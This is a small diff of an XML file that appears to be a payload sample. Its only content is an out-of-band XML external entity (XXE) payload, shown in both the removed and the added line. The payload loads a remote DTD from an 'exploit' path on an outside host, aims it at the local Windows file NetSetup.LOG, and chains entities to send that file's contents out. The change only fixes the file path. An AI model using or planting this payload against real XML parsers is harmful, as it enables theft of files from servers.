@@ -1,3 +1,3 @@
 <?xml version="1.0"?>
-<!DOCTYPE data [<!ENTITY % evildtd SYSTEM "https://www.aswsec.com/exploit/evildtd.php?file=/windows/debug/NetSetup.LOG&s=https://www.aswsec.com/?">%evildtd;%LoadOOBEnt;%OOB;]>
+<!DOCTYPE data [<!ENTITY % evildtd SYSTEM "https://www.aswsec.com/exploit/evildtd.php?file=c:/windows/debug/NetSetup.LOG&s=https://www.aswsec.com/?">%evildtd;%LoadOOBEnt;%OOB;]>
 <data></data>
